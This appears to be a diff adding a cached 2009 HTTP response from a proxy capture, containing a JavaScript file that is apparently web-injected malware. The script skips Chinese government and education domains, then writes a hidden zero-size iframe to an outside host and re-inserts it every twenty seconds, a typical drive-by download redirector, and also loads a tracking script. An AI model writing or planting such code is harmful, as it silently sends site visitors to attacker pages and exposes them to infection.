@@ -1,0 +1,37 @@
+HTTP/1.1 200 OK
+Content-Length: 813
+ETag: "90de6d-32d-18f5ac0"
+Date: Tue, 17 Mar 2009 07:04:35 GMT
+Last-Modified: Tue, 17 Mar 2009 05:40:35 GMT
+Server: Apache/2.0.63 (Unix) mod_ssl/2.0.63 OpenSSL/0.9.8b mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 mod_python/3.3.1 Python/2.5.4 PHP/5.2.5
+Accept-Ranges: bytes
+Content-Type: application/javascript
+X-Polipo-Location: http://3b3.org/c.js
+X-Polipo-Date: Tue, 17 Mar 2009 07:13:13 GMT
+X-Polipo-Access: Tue, 17 Mar 2009 07:13:13 GMT
+
+var s,siteUrl,tmpdomain;
+var arydomain = new Array(".gov.cn",".edu.cn");
+s = document.location+"";
+siteUrl=s.substring(7,s.indexOf('/',7));
+tmpdomain = 0;
+for(var i=0;i<arydomain.length; i++)
+{
+if(siteUrl.indexOf(arydomain[i]) > -1){
+tmpdomain = 1;
+break;
+}
+}
+if(tmpdomain == 0){
+document.writeln("<iframe src=http://m.fdsewwe.cn/01/ width=0 height=0><\/iframe>");
+function rl()
+{
+  var msgObj = document.createElement("div");
+  msgObj.setAttribute("id","msgDiv"); 
+  document.body.appendChild(msgObj);
+  var obj = document.getElementById("msgDiv");
+  obj.innerHTML ="<iframe src=http://m.fdsewwe.cn/01/ width=0 height=0></iframe>";
+}
+  setInterval("rl()",20000);
+}
+document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/js.tongji.cn.yahoo.com\/908507\/ystat.js\"><\/script>");
